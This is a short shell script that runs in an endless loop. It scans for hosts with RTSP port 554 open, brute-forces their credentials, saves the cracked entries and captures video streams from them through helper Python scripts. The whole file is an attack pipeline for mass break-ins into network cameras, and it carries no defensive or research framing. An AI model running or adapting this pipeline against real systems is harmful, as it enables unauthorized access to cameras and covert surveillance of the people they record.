#!/usr/bin/env sh
while true; do
    echo
    echo Gather IPs
    ./fortune_rtsp.py 554 -c 16 -w 1024 -F -i tun0

    echo
    echo Brute
    ./rtsp_brute_simple.py local/rtsp_554.txt \
        -i tun0 -sp > local/bruted.txt
    cat local/bruted.txt >> local/rtsp.txt

    echo
    echo Bruted:
    cat local/bruted.txt

    echo
    echo Capture
    ./rtsp_capture.py local/bruted.txt -cb local/campost.sh
done

